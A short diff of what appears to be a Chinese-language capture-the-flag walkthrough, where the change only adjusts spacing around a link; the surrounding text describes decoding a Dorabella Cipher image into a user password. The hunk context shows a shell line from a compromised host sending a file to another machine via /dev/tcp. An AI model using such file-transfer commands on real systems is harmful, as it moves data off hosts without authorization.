@@ -240,7 +240,7 @@ www-data@7r1umph:/opt$ cat yeyeye.png > /dev/tcp/192.168.205.128/4444
 
 通过图片内容和网络搜索 (Google识图等)，可以识别出这是一种名为 **Dorabella Cipher** 的密码。
 
-参考在线资料（如提供的链接 https://geocachen.nl/geocaching/geocache-puzzels-oplossen/dorabella-cipher/）进行破译，得到密码：`yecongdong`。
+参考在线资料（ 如提供的链接 https://geocachen.nl/geocaching/geocache-puzzels-oplossen/dorabella-cipher/ ）进行破译，得到密码：`yecongdong`。
 
 使用这个密码尝试切换到 `welcome` 用户。
 
